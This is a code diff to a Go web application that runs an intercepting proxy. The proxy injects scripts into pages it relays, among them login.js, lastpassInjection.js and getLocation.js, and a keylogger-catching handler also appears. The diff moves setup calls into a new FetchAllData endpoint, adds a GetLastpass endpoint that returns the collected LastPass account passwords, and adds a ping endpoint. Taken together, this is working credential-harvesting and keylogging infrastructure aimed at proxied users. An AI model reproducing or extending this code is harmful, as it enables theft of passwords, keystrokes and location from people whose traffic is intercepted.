@@ -22,20 +22,9 @@ type App struct {
 
 
 func InitiateProxy() {
-    //set the location for files
+	//set the location for files
     log.Println("loading storage location")
     setFileStorageLocation()
-    //get the redirect pages from server
-    log.Println("downloading files")
-    getPages()
-    //get a list of urls to redirect
-    log.Println("creating redirections...")
-    getRedirectUrls()
-    //get a list of urls to block
-    log.Println("get blocked urls...")
-    getBannedUrls()
-    log.Println("get news sites")
-    getNewsUrls()
     //reset all parameters for the proxy
 	globalStoreHAR = false			
 	globalProxyStandard = false
@@ -58,6 +47,22 @@ func InitiateProxy() {
 	INJECT_LOCATION_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/getLocation.js\"></script></body>"
 	INJECT_LASTPASS_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
 	INJECT_LOGIN_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/login.js\"></script></body>"
+}
+
+func (c App) FetchAllData() revel.Result {
+
+    //get the redirect pages from server
+    log.Println("downloading files")
+    getPages()
+    //get a list of urls to redirect
+    log.Println("creating redirections...")
+    getRedirectUrls()
+    //get a list of urls to block
+    log.Println("get blocked urls...")
+    getBannedUrls()
+    log.Println("get news sites")
+    getNewsUrls()
+    return c.RenderJson("finished fetching")
 }
 
 func (c App) Login() revel.Result {
@@ -275,6 +280,10 @@ func (c App) Lastpass() revel.Result {
 	l.Password = password
 	lastPassAccounts = append(lastPassAccounts, l)
 	//return all the lastpass accounts
+	return c.RenderJson("null")
+}
+
+func (c App) GetLastpass() revel.Result {
 	return c.RenderJson(lastPassAccounts)
 }
 func (c App) CatchKeyLog() revel.Result {
@@ -323,6 +332,9 @@ func (c App) GetHar() revel.Result {
     	return c.RenderJson("The file may not exist...")
     }
     return c.RenderJson(string(data))
+}
+func (c App) Pinger() revel.Result {
+	return c.RenderJson(pingServer())
 }
 func (c App) DeleteHars() revel.Result {
 	var w Walker
